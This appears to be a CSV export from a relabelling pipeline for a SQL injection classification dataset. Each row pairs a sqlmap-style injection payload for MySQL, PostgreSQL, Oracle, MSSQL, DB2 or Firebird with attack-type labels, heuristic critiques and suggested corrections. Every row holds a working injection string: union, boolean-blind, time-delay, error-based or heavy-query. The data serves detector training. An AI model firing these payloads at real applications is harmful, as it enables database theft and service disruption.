id,payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,payload_inner,wrapper_detected,strip_depth,a_type,a_db,a_signals,c_type,c_db,c_signals
23656,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf' = 'osqf",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'osqf' = 'osqf",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
23657,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'iifh' = 'iifh",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( 'iifh' = 'iifh",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23658,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 5324 = 5324",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( ( ( 5324 = 5324",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23659,"1"" ) where 7753 = 7753",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) where 7753 = 7753",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23660,"1 ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 9841 = 9841",heavy_query,mssql,0.7,mssql_sysjoin,RELABEL,reasoning too short (13 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"1 ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( 9841 = 9841",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23661,"( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select 1 from generate_series ( 9815,9815,case when ( 9815 = 9815 ) then 1 else 0 end ) limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,postgresql,"( cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select 1 from generate_series ( 9815,9815,case when ( 9815 = 9815 ) then 1 else 0 end ) limit 1 ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) )",False,0,boolean_blind,postgresql,generic SQL keywords without specific signal,boolean_blind,postgresql,generic SQL structure without strong signal
23662,"1' ) as wtfo where 5666 = 5666 union all select null,null,null,null--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"1' ) as wtfo where 5666 = 5666 union all select null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23663,1' ) ) and 3355 = 6012 and ( ( 'ofmy' = 'ofmy,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) ) and 3355 = 6012 and ( ( 'ofmy' = 'ofmy,False,0,boolean_blind,generic,Pattern match: 'and 3355 = 6012' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23664,"-7579%"" or 6570 = 1764",boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,"-7579%"" or 6570 = 1764",False,0,boolean_blind,generic,Pattern match: 'or 6570 = 1764' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23665,"elt ( 2567 = 9921,9921 )",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"elt ( 2567 = 9921,9921 )",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
23666,-8086%' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( '%' = ',out_of_band,oracle,0.9,utl_inaddr,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'error_based' (P4) but labeled 'out_of_band' (P6),error_based,oracle,-8086%' ) or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( '%' = ',False,0,error_based,oracle,Pattern match: 'utl_inaddr.get_host_address' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'utl_inaddr' detected
23667,"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,time_blind,oracle,0.9,dbms_pipe,RELABEL,reasoning too short (9 chars),time_blind,oracle,"1%"" ) ) ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ( ( ""%"" = """,False,0,time_blind,oracle,Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle,time_blind,oracle,time function 'dbms_pipe' detected
23668,-9562' or 8571 = 8571--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-9562' or 8571 = 8571--,False,0,boolean_blind,generic,Pattern match: 'or 8571 = 8571' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23669,"1'+ ( select nvht where 9118 = 9118 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",heavy_query,db2,0.7,db2_sysjoin,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,db2,"1'+ ( select nvht where 9118 = 9118 or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ) +'",False,0,boolean_blind,db2,generic SQL keywords without specific signal,boolean_blind,db2,generic SQL structure without strong signal
23670,"1%"" and ( 2850 = 6610 ) *6610 and ""%"" = """,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1%"" and ( 2850 = 6610 ) *6610 and ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
23671,-3982 ) ) or 6872 = 6872 and ( ( 6331 = 6331,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-3982 ) ) or 6872 = 6872 and ( ( 6331 = 6331,False,0,boolean_blind,generic,Pattern match: 'or 6872 = 6872' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23672,"1%' ) union all select null,null,null,null,null,null--",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1%' ) union all select null,null,null,null,null,null--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23673,1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 4574 = 4574,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,1 ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 4574 = 4574,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
23674,"1"" ) as jngl where 8384 = 8384 and 4580 = 1718--",boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1"" ) as jngl where 8384 = 8384 and 4580 = 1718--",False,0,boolean_blind,generic,Pattern match: 'and 4580 = 1718' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23675,"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
23676,"1%' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",time_blind,postgresql,0.7,generate_series,RELABEL,reasoning too short (15 chars); rule-check disagrees: rule says 'heavy_query' (P4) but labeled 'time_blind' (P5),heavy_query,postgresql,"1%' ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",False,0,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload)
23677,1 ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 1073 = 1073,time_blind,mysql,0.7,rlike_sleep,RELABEL,reasoning too short (11 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,mysql,1 ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 1073 = 1073,False,0,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)"
23678,1'|| ( select 'rdqv' from dual where 1894 = 1894,union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,1'|| ( select 'rdqv' from dual where 1894 = 1894,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
23679,-6202 ) ) or 7845 = 1962--,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-6202 ) ) or 7845 = 1962--,False,0,boolean_blind,generic,Pattern match: 'or 7845 = 1962' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23680,"1 where 4468 = 4468 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1 where 4468 = 4468 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
23681,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%"" = """,heavy_query,oracle,0.7,oracle_sysjoin,RELABEL,reasoning too short (14 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,generic,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23682,"-2340%"" order by 1#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-2340%"" order by 1#",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
23683,"1'|| ( select 'gtri' from dual where 7097 = 7097 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",time_blind,mysql,0.7,elt_sleep,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,oracle,"1'|| ( select 'gtri' from dual where 7097 = 7097 and elt ( 1210 = 1210,sleep ( 5 ) ) ) ||'",False,0,boolean_blind,oracle,Pattern match: 'elt (' → boolean_blind (P3); DB signature: oracle,boolean_blind,oracle,generic SQL structure without strong signal
23684,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'mqoj' like 'mqoj,time_blind,mysql,0.7,sleep_subquery,RELABEL,reasoning too short (14 chars),time_blind,mysql,1' ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( 'mqoj' like 'mqoj,False,0,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal
23685,1 ) where 4992 = 4992,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1 ) where 4992 = 4992,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23686,"-4093' ) ) union all select 5785,5785,5785#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-4093' ) ) union all select 5785,5785,5785#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23687,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'ngxz' = 'ngxz",error_based,mysql,0.9,updatexml,RELABEL,reasoning too short (9 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,mysql,"1' ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( 'ngxz' = 'ngxz",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23688,-8181' ) ) or 5926 = 3332#,boolean_blind,generic,0.5,or_equality,RELABEL,reasoning too short (11 chars); confidence too low (0.50),boolean_blind,generic,-8181' ) ) or 5926 = 3332#,False,0,boolean_blind,generic,Pattern match: 'or 5926 = 3332' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23689,1' ) as pghp where 9086 = 9086,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,1' ) as pghp where 9086 = 9086,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23690,"1%"" ) ) and ( 7817 = 4371 ) *4371 and ( ( ""%"" = """,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,"1%"" ) ) and ( 7817 = 4371 ) *4371 and ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
23691,"1, ( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4932 = 4932 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",error_based,mssql,0.9,convert_char,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'error_based' (P4),boolean_blind,generic,"1, ( convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4932 = 4932 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) )",False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23692,1 ) ) as eveb where 7567 = 7567,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,1 ) ) as eveb where 7567 = 7567,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23693,"1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,"1%"" ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
23694,"-3902' ) ) ) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-3902' ) ) ) union all select 3999,3999,3999,3999,3999,3999,3999,3999,3999#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23695,"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'gfll' = 'gfll",error_based,mysql,0.9,extractvalue,RELABEL,reasoning too short (12 chars),error_based,mysql,"1' ) ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ( 'gfll' = 'gfll",False,0,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23696,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'jhxh' = 'jhxh",heavy_query,firebird,0.7,firebird_sysjoin,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'heavy_query' (P4),boolean_blind,firebird,"1' ) or 7552 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( 'jhxh' = 'jhxh",False,0,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal
23697,"-9684"" order by 1#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-9684"" order by 1#",False,0,benign,generic,no attack signal detected,benign,generic,no SQLi signal in heuristic check
23698,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""poik"" = ""poik",time_blind,mysql,0.9,benchmark,RELABEL,reasoning too short (9 chars),time_blind,mysql,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ""poik"" = ""poik",False,0,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload)
23699,-1579%' ) ) ) union all select 7272#,union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,-1579%' ) ) ) union all select 7272#,False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23700,1' in boolean mode ) and 9198 = 9198--,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,generic,1' in boolean mode ) and 9198 = 9198--,False,0,boolean_blind,generic,Pattern match: 'and 9198 = 9198' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)"
23701,"1"" ) as piwi where 2918 = 2918",union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,"1"" ) as piwi where 2918 = 2918",False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23702,"1%"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"1%"" ) ) ) and elt ( 4249 = 4249,7259 ) and ( ( ( ""%"" = """,False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
23703,"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-8869"" where 3019 = 3019 union all select 3019,3019,3019#",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23704,1 ) where 4653 = 4653 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,0.9,pg_sleep,RELABEL,reasoning too short (8 chars),time_blind,postgresql,1 ) where 4653 = 4653 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,False,0,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal
23705,"-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",union_based,generic,0.7,union_select,RELABEL,reasoning too short (12 chars),union_based,generic,"-4876"" ) ) as saug where 2256 = 2256 union all select 2256,2256,2256,2256,2256,2256,2256,2256,2256,2256--",False,0,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure
23706,"1%"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """,time_blind,postgresql,0.7,pg_sleep,RELABEL,reasoning too short (8 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1%"" ) ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( ( ""%"" = """,False,0,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal
23707,"1 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",time_blind,postgresql,0.7,regexp_substring,RELABEL,reasoning too short (16 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'time_blind' (P5),boolean_blind,generic,"1 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",False,0,boolean_blind,generic,generic SQL keywords without specific signal,heavy_query,generic,contains 7+ digit number (DoS-style payload)
23708,"1%' ) ) and elt ( 4483 = 5364,5364 ) and ( ( '%' = '",boolean_blind,mysql,0.7,elt_boolean,RELABEL,reasoning too short (11 chars),boolean_blind,mysql,"1%' ) ) and elt ( 4483 = 5364,5364 ) and ( ( '%' = '",False,0,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check
23709,"-7271' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'mdtw' = 'mdtw",boolean_blind,mysql,0.7,make_set,RELABEL,reasoning too short (8 chars),boolean_blind,mysql,"-7271' ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 'mdtw' = 'mdtw",False,0,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check
23710,1 ) ) as efjb where 4642 = 4642 order by 1#,union_based,generic,0.7,union_null,RELABEL,reasoning too short (10 chars),union_based,generic,1 ) ) as efjb where 4642 = 4642 order by 1#,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23711,"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars),union_based,oracle,"-8677'|| ( select 'ihpm' from dual where 9571 = 9571 union all select 9571,9571,9571,9571,9571,9571,9571,9571,9571,9571--",False,0,union_based,oracle,Pattern match: 'union all select' → union_based (P7); DB signature: oracle,union_based,oracle,UNION SELECT structure
23712,1' ) where 2840 = 2840,boolean_blind,generic,0.5,where_equality,RELABEL,reasoning too short (14 chars); confidence too low (0.50),boolean_blind,generic,1' ) where 2840 = 2840,False,0,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal
23713,1'|| ( select 'yyil' from dual where 3121 = 3121,union_based,oracle,0.7,oracle_union,RELABEL,reasoning too short (12 chars); rule-check disagrees: rule says 'boolean_blind' (P3) but labeled 'union_based' (P7),boolean_blind,oracle,1'|| ( select 'yyil' from dual where 3121 = 3121,False,0,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal
